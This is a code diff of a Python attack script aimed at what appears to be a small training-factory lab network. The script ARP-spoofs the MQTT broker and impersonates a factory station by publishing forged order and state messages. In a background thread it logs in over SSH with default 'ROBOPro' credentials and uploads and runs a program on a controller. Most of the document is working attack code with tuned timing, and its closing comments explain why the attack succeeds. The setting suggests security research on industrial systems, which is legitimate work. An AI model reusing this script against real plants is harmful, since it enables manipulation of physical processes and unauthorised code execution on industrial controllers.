@@ -1,14 +1,10 @@
-import random
 import time
 import threading
 from datetime import timezone, datetime
 import logging
 import json
+import subprocess
 
-from scapy.contrib import mqtt
-import scapy.all as scapy
-
-import sqlite3
 import paho.mqtt.client as mqtt
 
 from paramiko import SSHClient
@@ -18,18 +14,15 @@ from scp import SCPClient
 logger = logging.getLogger("attack_order")
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-"Starting"
-# First we definee variables
+# First we define variables
 src_ip = "192.168.0.105"
 dst_ip = "192.168.0.10"
 dst_port = 1883
 
-msgid_received_order = 9999999999999999999999999999999999999
-order_received = False
-
+order_color = None
 
 def second_attack():
-    print("Starting file upload attack on 192.168.0.13")
+    logger.info("Starting file upload attack on 192.168.0.13")
     server = '192.168.0.13'
     port = '22'
     username = password = 'ROBOPro'
@@ -51,10 +44,14 @@ def second_attack():
     time.sleep(7)
     ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
     ssh.exec_command('./TxtParkPosVGR')
-    print("Finished file upload attack on 192.168.0.13")
+    logger.info("Finished file upload attack on 192.168.0.13")
 
-
-thread = threading.Thread(target=second_attack)
+# since threads cannot be restarted by calling the .start(), the workaround is to just pre-create 10 threads in a list
+threads_list = []
+for i in range(10):
+        thread = threading.Thread(target=second_attack)
+        threads_list.append(thread)
+thread_counter = 0
 
 
 def state(active, code, description="", station="vgr", target=None):
@@ -81,8 +78,7 @@ def on_connect(client, *lis):
     # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
     [client.subscribe(x) for x in
      ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
-    print("Chunk subscribe done")
-    logger.info("Subscription to topics of interest done")
+    logger.info("Subscription to all topics of interest done")
     time.sleep(0.1)
     # Now we publish our fir
     data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
@@ -104,7 +100,7 @@ def on_subscribe(client, *lis):
 
 # What happens when a publish message is sent from us and a puback has been received
 def on_publish(client, userdata, msgid, *rest):
-    global msgid_received_order
+    global thread_counter
 
     # variable to simulate legitimate msgid just for the purposes of our code
     msgid_sim = client.user_data_get()
@@ -175,15 +171,15 @@ def on_publish(client, userdata, msgid, *rest):
 
         # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
         case 18 | 23 | 26 | 27 | 28:
-            (active, code) = (1, 2) if msgid in [18, 26] else (0, 1)
+            (active, code) = (1, 2) if msgid_sim in [18, 26] else (0, 1)
             data = state(active, code, "", "vgr", "")
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case 19 | 21 | 24 | 29 | 31 | 61 | 66 | 68 | 81 | 89 | 98 | 103 | 108 | 110:
-            if msgid == 81:
+            if msgid_sim == 81:
                 time.sleep(2)
-            if msgid == 98:
+            if msgid_sim == 98:
                 time.sleep(2)
             data = state(0, 1, "", "dsi")
             client.publish("f/i/state/dsi", data, qos=1)
@@ -203,42 +199,45 @@ def on_publish(client, userdata, msgid, *rest):
 
         case 34:
             data = '{\n\t"code" : 3,\n\t' + new_ts()[:-2] + \
-                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
+                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
+
             client.publish("fl/vgr/do", data, qos=1)
+            print("34 fl/vgr/do")
             client.user_data_set(client.user_data_get() + 1)
+            threads_list[thread_counter].start()
             # time.sleep(50)
-            # thread.start()
 
 
         # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
         case 35 | 38 | 40 | 41 | 42 | 44 | 46 | 48:
-            if msgid == 38:
+            if msgid_sim == 38:
                 time.sleep(7)
-            if msgid == 40:
+            if msgid_sim == 40:
                 time.sleep(1)
-            if msgid == 41:
+            if msgid_sim == 41:
                 time.sleep(1.5)
-            if msgid == 42:
+            if msgid_sim == 42:
                 time.sleep(10)
-            if msgid == 46:
+            if msgid_sim == 46:
                 time.sleep(0.2)
-            if msgid == 48:
+            if msgid_sim == 48:
                 time.sleep(1)
                 
             data = state(0, 1, "", "vgr", "hbw")
             client.publish("f/i/state/vgr", data, qos=1)
+            print("44 /state/vgr")
             client.user_data_set(client.user_data_get() + 1)
 
     # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
-        case 36 | 37 | 39 | 40 | 42 | 45 | 47:
-            if msgid == 37:
+        case 36 | 37 | 39 | 40 | 43 | 45 | 47:
+            if msgid_sim == 37:
                 time.sleep(2)
-            if msgid == 43:
+            if msgid_sim == 43:
                 client.user_data_set(-1)  # where -1 is just user defined so that the case will always default to `case -1`
                 # (where nothing will happen) until user_data_set is used in the on_message() function
 
             #     time.sleep(3.5)
-            if msgid == 45:
+            if msgid_sim == 45:
                 time.sleep(2)
 
             data = state(1, 2, "", "vgr", "hbw")
@@ -247,23 +246,23 @@ def on_publish(client, userdata, msgid, *rest):
 
         case 49:
             data = '{\n\t"code" : 4,\n\t' + new_ts()[:-2] + \
-                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
+                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
             client.publish("fl/vgr/do", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         # case block to handle bulk cases where active, code, target is 0,1,mpo respectively
         case 50 | 53 | 55 | 56 | 64 | 65 | 70 | 71 | 72 | 73 | 74:
-            if msgid == 53:
+            if msgid_sim == 53:
                 time.sleep(3.8)
-            if msgid == 56:
+            if msgid_sim == 56:
                 time.sleep(6)
-            if msgid == 60:
+            if msgid_sim == 60:
                 time.sleep(5.5)
-            if msgid == 70:
+            if msgid_sim == 70:
                 time.sleep(2.8)
-            if msgid in [71, 72, 73, 74]:
+            if msgid_sim in [71, 72, 73, 74]:
                 time.sleep(10)
-            if msgid == 75:
+            if msgid_sim == 75:
                 client.user_data_set(-1)
 
             data = state(0, 1, "", "vgr", "mpo")
@@ -272,40 +271,45 @@ def on_publish(client, userdata, msgid, *rest):
 
         # case block to handle bulk cases where active, code, target is 1,2,mpo respectively
         case 51 | 52 | 54 | 59 | 63:
-            if msgid == 52:
+            if msgid_sim == 52:
                 time.sleep(2)
             data = state(1, 2, "", "vgr", "mpo")
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case 57:
-            data = '{\n\t"state" : "IN_PROCESS",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
+            data = '{\n\t"state" : "IN_PROCESS",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
             client.publish("f/i/order", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case 58:
             data = '{\n\t"code" : 7,\n\t' + new_ts()[:-2] + \
-                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
+                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
             client.publish("fl/vgr/do", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         # case block to handle bulk cases where active, code, target is 0,1,dso respectively
-        case 76 | 78 | 80 | 84 | 86 | 87 | 92 | 94 | 102 | 106 | 107:
-            if msgid == 78:
+        case 76 | 78 | 80 | 84 | 86 | 87 | 92 | 94 | 96 | 102 | 106 | 107:
+            # if msgid_sim == 76:
+            #     client.user_data_set(-1)
+            if msgid_sim == 78:
                 time.sleep(3.3)
-            if msgid == 92:
+            if msgid_sim == 92:
                 time.sleep(0.6)
+            if msgid_sim == 96:
+                time.sleep(4.5)
+            if msgid_sim == 107:
+                # then we wait to be sure the SSH attack is done
+                logger.info("Waiting for attack to finish, almost there")
+                threads_list[thread_counter].join()
+                thread_counter += 1
+
             data = state(0, 1, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
-            # if msgid == 107:
-            #     # then we wait to be sure the SSH attack is done
-            #     thread.join()
             client.user_data_set(client.user_data_get() + 1)
 
         # case block to handle bulk cases where active, code, target is 1,2,dso respectively
-        case 77 | 79 | 83 | 85 | 91 | 93 | 96 | 105:
-            if msgid == 96:
-                time.sleep(4.5)
+        case 77 | 79 | 83 | 85 | 91 | 95 | 105:
             data = state(1, 2, "", "vgr", "dso")
             client.publish("f/i/state/vgr", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
@@ -318,25 +322,24 @@ def on_publish(client, userdata, msgid, *rest):
         case 88:
             time.sleep(1)
             data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 800,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + \
-            new_ts()[-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "048e9b92186581",\n\t\t"state" : "PROCESSED",\n\t\t"type" : "WHITE"\n\t}\n}'
+            new_ts()[-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "048e9b92186581",\n\t\t"state" : "PROCESSED",\n\t\t"type" : "%s"\n\t}\n}' % order_color
             client.publish("f/i/nfc/ds", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case 97:
-            data = '{\n\t"state" : "SHIPPED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
+            data = '{\n\t"state" : "SHIPPED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
             client.publish("f/i/order", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case 100 | 101:
-            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n }'
+            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n }' % order_color
             client.publish("f/i/order", data, qos=1)
             client.user_data_set(client.user_data_get() + 1)
 
         case -1:
             pass
 
-
-        # case to send f/i/state/vgr information every 10 seconds when there is no process to fufill in FL
+        # case to send f/i/state/vgr information every 10 seconds when there is no process/order to fufill in FL
         case _:
             time.sleep(10)
             data = state(0, 1, "", "vgr", "hbw")
@@ -344,61 +347,65 @@ def on_publish(client, userdata, msgid, *rest):
             client.user_data_set(client.user_data_get() + 1)
 
 
-
-# What happens if a Publish Message is received? Then we send PubAck
-# Update: This function just prints output for now, it may come in useful when I have set my IP to that of the VGR
 def on_message(client, userdata, mqttmsg):
+    global order_color
     mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
-    # client.ack(mid=mqttmsg.mid, qos=client.q)
-    print(mqttpayload)
-
-    # -------------------
-    print(f"""A publish message was received from broker with the following signature
-    Client: {dir(client)}
-    -------------------------
-    Other: {dir(mqttmsg)}""")
-
-    #UPdate: the below client.ack doesn't kick in because I have not set manual_ack=True in client.connect
-    #client.ack(mid=mqttmsg.mid, qos=1)  #-- plan here is to take the mid and qos from the received message and place here
 
     if mqttmsg.topic == "f/o/order":
         logger.info("Order received from Dashboard via broker")
 
         order_color = mqttpayload['type']
-        print("Ordered color is: " + order_color)
         logger.info("Ordered color is: " + order_color)
 
-
-        data = '{\n\t"state" : "ORDERED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
-        #global msgid_received_order, order_received
+        data = '{\n\t"state" : "ORDERED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
         client.publish("f/i/order", data, qos=1)
         client.user_data_set(34)
-        #order_received = True
-        #print("HAVE A LOOK HERE. You left this open to handle the case of when the broker publishes an order"
-              #"to 192.168.0.13 via f/o/order, so you can then begin your stealthy attack with f/i/order at id 34")
+        print("Ordered f/o/order")
 
     if mqttmsg.topic == "fl/hbw/ack" and mqttpayload["code"] == 1:
         data = state(1, 2, "", "vgr", "hbw")
         client.publish("f/i/state/vgr", data, qos=1)
         client.user_data_set(44)
+        print("HBW ack")
 
     if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 2:
         data = state(0, 1, "", "vgr", "mpo")
         client.publish("f/i/state/vgr", data, qos=1)
         client.user_data_set(76)
+        print("mpo/ack")
+
+    # if mqttmsg.topic == "fl/sld/ack" and mqttpayload["code"] == 2:
+    #     data = state(0, 1, "", "vgr", "dso")
+    #     client.publish("f/i/state/vgr", data, qos=1)
+    #     client.user_data_set(77)
 
 
+# set IP tables queue as drop
+# ss = subprocess.getoutput('iptables -P FORWARD DROP')  # haven't tried iptables drop in-code, but this code worked fine when I manually set iptables as DROP
+
+# send 1 arp spoof packet to poison broker arp cache
+ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.13 -t 192.168.0.10')
+logging.info("Successfully spoofed VGR with just 1 arp packet")
 
 mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
-mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without txt
-mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=60)
+mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without username/password
+mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=120)
 
 
 mqtt_connect.on_connect = on_connect
 mqtt_connect.on_subscribe = on_subscribe
 mqtt_connect.on_publish = on_publish
-mqtt_connect.on_message = on_message  #-- use this if manual_ack==True is ever set in mqtt.Client
-
+mqtt_connect.on_message = on_message
 
 
 mqtt_connect.loop_forever()
+
+
+
+# POINTS:
+# My ARP attack (sending just 1 arp packet) to the broker works. I believe because I configured my IP tables FORWARD
+# chain to drop the packets, the arp attack stop the broker program. The broker program while stopped (likely after a
+# timeout that may have been included in the broker programming), doesn't send out
+# any packets that would cause the arp cache on it to roll back to original
+# and because the BROKER Program stops, the VGR program stops too (because it sends packets to the broker and gets no
+# response). And as a result our attack is possible
